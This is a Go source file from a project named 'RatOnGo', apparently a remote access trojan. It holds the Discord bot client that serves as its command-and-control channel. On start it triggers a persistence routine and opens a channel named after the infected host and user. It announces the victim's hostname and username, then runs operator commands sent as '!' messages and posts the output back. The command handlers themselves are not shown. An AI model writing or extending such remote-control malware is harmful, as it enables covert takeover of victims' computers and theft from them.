package bot

import (
	"RatOnGo/internal/handlers"
	"context"
	"fmt"
	"os"
	"strings"
	"sync"
	"time"

	"github.com/bwmarrin/discordgo"
)

const (
	MaxMessageLength = 1900
	MessageDelay     = 500 * time.Millisecond
	CommandPrefix    = "!"
)

type Client struct {
	session   *discordgo.Session
	channelID string
	guildID   string
	handlers  *handlers.Manager
	mu        sync.RWMutex
	active    bool
}

func NewClient(token, guildID string) (*Client, error) {
	session, err := discordgo.New("Bot " + token)
	if err != nil {
		return nil, err
	}

	return &Client{
		session:  session,
		guildID:  guildID,
		handlers: handlers.NewManager(),
		active:   true,
	}, nil
}

func (c *Client) Start(ctx context.Context) error {
	c.session.AddHandlerOnce(c.onReady)
	c.session.AddHandler(c.onMessage)
	c.session.Identify.Intents = discordgo.IntentsGuildMessages | discordgo.IntentsGuilds

	if err := c.session.Open(); err != nil {
		return err
	}

	<-ctx.Done()
	return c.session.Close()
}

func (c *Client) onReady(s *discordgo.Session, r *discordgo.Ready) {
	if err := c.setupChannel(); err != nil {
		c.Shutdown()
		return
	}

	go func() {
		if result := c.handlers.EnsurePersistence(); result != "" {
			c.sendMessage("✅ System initialized")
		}
	}()

	hostname, _ := os.Hostname()
	username := os.Getenv("USERNAME")

	msg := fmt.Sprintf("🟢 **Session Active**\n```\nHost: %s\nUser: %s\nReady for commands\n```",
		hostname, username)
	c.sendMessage(msg)
}

func (c *Client) setupChannel() error {
	hostname, _ := os.Hostname()
	username := os.Getenv("USERNAME")

	channelName := fmt.Sprintf("sys-%s-%s",
		strings.ToLower(hostname[:min(len(hostname), 8)]),
		strings.ToLower(username[:min(len(username), 6)]))

	ch, err := c.session.GuildChannelCreate(c.guildID, channelName, discordgo.ChannelTypeGuildText)
	if err != nil {
		return err
	}

	c.channelID = ch.ID
	return nil
}

func (c *Client) onMessage(s *discordgo.Session, m *discordgo.MessageCreate) {
	if !c.active || m.Author.ID == s.State.User.ID || m.ChannelID != c.channelID {
		return
	}

	if !strings.HasPrefix(m.Content, CommandPrefix) {
		return
	}

	parts := strings.Fields(m.Content)
	if len(parts) == 0 {
		return
	}

	command := strings.TrimPrefix(parts[0], CommandPrefix)
	args := parts[1:]

	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()

	go func() {
		result := c.handlers.Execute(ctx, command, args, c.session, c.channelID)
		if result != "" {
			c.sendMessage(result)
		}
	}()
}

func (c *Client) sendMessage(content string) {
	if !c.active || content == "" {
		return
	}

	c.mu.Lock()
	defer c.mu.Unlock()

	formatted := "```\n" + content + "\n```"

	if len(formatted) <= MaxMessageLength {
		c.session.ChannelMessageSend(c.channelID, formatted)
		return
	}

	chunks := c.splitMessage(content, MaxMessageLength-10)
	for i, chunk := range chunks {
		if i > 0 {
			time.Sleep(MessageDelay)
		}
		c.session.ChannelMessageSend(c.channelID, "```\n"+chunk+"\n```")
	}
}

func (c *Client) splitMessage(content string, maxLen int) []string {
	var chunks []string
	for len(content) > maxLen {
		chunks = append(chunks, content[:maxLen])
		content = content[maxLen:]
	}
	if len(content) > 0 {
		chunks = append(chunks, content)
	}
	return chunks
}

func (c *Client) Shutdown() {
	c.mu.Lock()
	c.active = false
	c.mu.Unlock()

	if c.session != nil {
		c.session.Close()
	}
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}
